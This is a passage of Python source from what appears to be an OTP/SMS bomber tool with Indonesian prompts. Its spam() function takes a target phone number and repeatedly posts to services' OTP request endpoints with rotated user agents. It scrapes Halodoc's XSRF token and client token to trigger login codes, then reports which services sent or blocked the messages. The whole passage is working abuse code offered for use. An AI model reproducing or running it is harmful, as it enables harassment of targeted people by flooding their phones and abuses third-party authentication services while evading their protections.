import threading

LOADING = True

def loading_loop():
    bars = 10
    i = 0
    while LOADING:
        filled = "♦" * i
        empty = "░" * (bars - i)
        color = COLORS[i % len(COLORS)]
        sys.stdout.write(f"\r  [{color}{filled}{N}{empty}] ")
        sys.stdout.flush()
        i = (i + 1) % (bars + 1)
        time.sleep(0.2)
    sys.stdout.write("\r" + " " * 40 + "\r")

def spam(phone):
    global LOADING
    print(f"\n  {C}[*] Target : {phone}{N}")
    
    try:
        loop = int(input(f"  {C}[?] Loop (1-5): {N}").strip() or "1")
        if loop < 1: loop = 1
        if loop > 5: loop = 5
    except:
        loop = 1
    
    print(f"\n  {Y}Pilih Kecepatan:{N}")
    print(f"  {W}[1] 1 detik (Cepat){N}")
    print(f"  {W}[2] 2 detik{N}")
    print(f"  {W}[3] 3 detik (Normal){N}")
    print(f"  {W}[4] 4 detik{N}")
    print(f"  {W}[5] 5 detik (Aman){N}")
    try:
        speed = int(input(f"  {C}[?] Pilih (1-5): {N}").strip() or "3")
        if speed < 1: speed = 1
        if speed > 5: speed = 5
    except:
        speed = 3
    
    print(f"\n  {C}[*] Loop : {loop}x | Delay : {speed}s{N}\n")
    
    sent = []
    blocked = []
    failed = []
    
    # Start loading thread
    LOADING = True
    t = threading.Thread(target=loading_loop)
    t.start()
    
    for l in range(loop):
        el = _x(phone)
        for name, url, h, b in el:
            h["User-Agent"] = _u()
            
            if b.pop("_halodoc", False):
                try:
                    import requests as _rr, re
                    s = _rr.Session()
                    s.headers.update({"User-Agent": _u()})
                    r = s.get("https://www.halodoc.com/login", timeout=10)
                    xsrf = s.cookies.get("XSRF-TOKEN", "")
                    h["X-XSRF-TOKEN"] = xsrf
                    match = re.search(r'clientToken["\']?\s*[=:]\s*["\']([a-f0-9]+)["\']', r.text)
                    ct = match.group(1) if match else "5a46f557bbabb198d46f00119c958ad0ddd25880508c1cc62337a8adac661af9"
                    url = f"https://www.halodoc.com/magneto-api/v2/users/authentication/otp/requests?clientToken={ct}"
                except:
                    pass
            
            try:
                import requests as _rr
                if b.pop("is_form", False):
                    rr = _rr.post(url, data=b, headers=h, timeout=15)
                else:
                    rr = _rr.post(url, json=b, headers=h, timeout=15)
                s = rr.status_code
                if s in (200, 201, 202): sent.append(name)
                elif s in (429, 403, 401): blocked.append(name)
                else: failed.append(name)
            except:
                failed.append(name)
            time.sleep(speed)
    
    # Stop loading thread
    LOADING = False
    t.join()
    sys.stdout.write("\r" + " " * 40 + "\r")
    
    print(f"\n  {G}=== HASIL ==={N}")
    if sent: print(f"  {G}✓ Terkirim ({len(sent)}): {', '.join(sent)}{N}")
    if blocked: print(f"  {Y}⊗ Diblokir ({len(blocked)}): {', '.join(blocked)}{N}")
    if failed: print(f"  {R}✗ Gagal ({len(failed)}): {', '.join(failed)}{N}")
    
    input(f"\n  {W}[Enter] Kembali...{N}")
